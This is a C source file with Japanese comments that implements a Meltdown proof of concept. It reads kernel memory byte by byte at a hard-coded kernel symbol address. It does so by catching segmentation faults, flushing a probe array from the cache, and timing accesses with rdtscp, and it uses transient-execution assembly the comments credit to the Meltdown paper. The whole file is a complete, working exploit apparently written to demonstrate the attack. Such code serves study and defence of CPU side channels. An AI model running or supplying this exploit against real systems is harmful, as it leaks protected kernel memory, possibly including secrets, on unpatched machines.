#include <assert.h>
#include <fcntl.h>
#include <limits.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#pragma GCC optimize("O0")

#define PAGE_SIZE (4096)

/*
    読み出し対象のカーネル空間のアドレス

    $ sudo grep linux_proc_banner /proc/kallsyms
    ffffffff824002a0 D linux_proc_banner
    $
*/
#define READ_TARGET (void *)(0xffffffff824002a0)
#define READ_LEN (64)
#define READ_TRIES (100)

jmp_buf env;
uint8_t *probe_array;

// カーネル空間へアクセスした時に発生する例外から復帰するための例外ハンドラ
void sigsegv_handler(int signum) {
  sigset_t set;
  sigemptyset(&set);
  sigaddset(&set, SIGSEGV);
  sigprocmask(SIG_UNBLOCK, &set, NULL);

  longjmp(env, 1);
}

// probe_arrayを配列参照した時のアクセス時間を測定する関数
uint64_t measure_access_time(uint64_t index) {
  uint64_t t0hi, t0lo, t1hi, t1lo, access_time;
  asm volatile(
      "rdtscp                     \n"
      "mov %%rdx, %[t0hi]         \n"
      "mov %%rax, %[t0lo]         \n"
      "mov (%[access_ptr]), %%rax \n"
      "rdtscp                     \n"
      "mov %%rdx, %[t1hi]         \n"
      "mov %%rax, %[t1lo]         \n"
      : [t0hi] "=&r"(t0hi), [t0lo] "=&r"(t0lo), [t1hi] "=&r"(t1hi),
        [t1lo] "=&r"(t1lo)
      : [access_ptr] "r"(&probe_array[index * PAGE_SIZE])
      : "rdx", "rax", "rcx");
  return ((t1hi << 32) | t1lo) - ((t0hi << 32) | t0lo);
}

// probe_arrayのキャッシュを無効化する関数
void flush_probe_caches(void) {
  for (int i = 0; i < 256; i++) {
    asm volatile("clflush (%[flush_ptr])"
                 :
                 : [flush_ptr] "r"(&probe_array[i * PAGE_SIZE]));
  }
}

// カーネル空間からのデータ読み出しを試みる関数
void __attribute__((noinline)) meltdown_core(void *p) {
  signal(SIGSEGV, sigsegv_handler);
  if (!setjmp(env)) {
    // Meltdown論文から引用
    asm volatile(
        "xor %%rax, %%rax           \n"
        "retry:                     \n"
        "movb (%%rcx), %%al         \n"
        "shl $0xc, %%rax            \n"
        "jz retry                   \n"
        "movq (%%rbx, %%rax), %%rbx \n"
        :
        : "c"(p), "b"(probe_array)
        : "rax");
  }
  signal(SIGSEGV, SIG_DFL);
}

// カーネル空間中の読み出し対象データをあらかじめキャッシュに読み込んでおく関数
void cache_read_target(void) {
  int fd, ret;
  char version[0x100];
  fd = open("/proc/version", O_RDONLY);
  assert(fd >= 0);
  ret = pread(fd, version, sizeof(version), 0);
  assert(ret > 0);
  ret = close(fd);
  assert(ret == 0);
}

int main(void) {
  // probe_arrayを初期化
  probe_array = mmap(NULL, 256 * PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(probe_array >= 0);
  memset(probe_array, 0, 256 * PAGE_SIZE);

  for (int i = 0; i < READ_LEN; i++) {
    void *read_ptr;
    int guess_stats[256];
    read_ptr = READ_TARGET + i;
    memset(guess_stats, 0, sizeof(guess_stats));

    for (int j = 0; j < READ_TRIES; j++) {
      flush_probe_caches();
      cache_read_target();

      meltdown_core(read_ptr);

      // probe_arrayの添え字のうち最もアクセス時間が短いものを記録
      uint64_t time_min = UINT64_MAX;
      uint8_t guess = 0;
      for (int k = 0; k < 256; k++) {
        uint64_t time_access = measure_access_time(k);
        if (time_access < time_min) {
          time_min = time_access;
          guess = k;
        }
      }
      guess_stats[guess]++;
    }

    // 最短のアクセス時間だった回数が最も多い添え字を推定データとして最終確定
    int count_max = -1;
    uint8_t final_guess = 0;
    for (int j = 0; j < 256; j++) {
      if (guess_stats[j] > count_max) {
        count_max = guess_stats[j];
        final_guess = j;
      }
    }
    putchar(final_guess);
  }

  return 0;
}
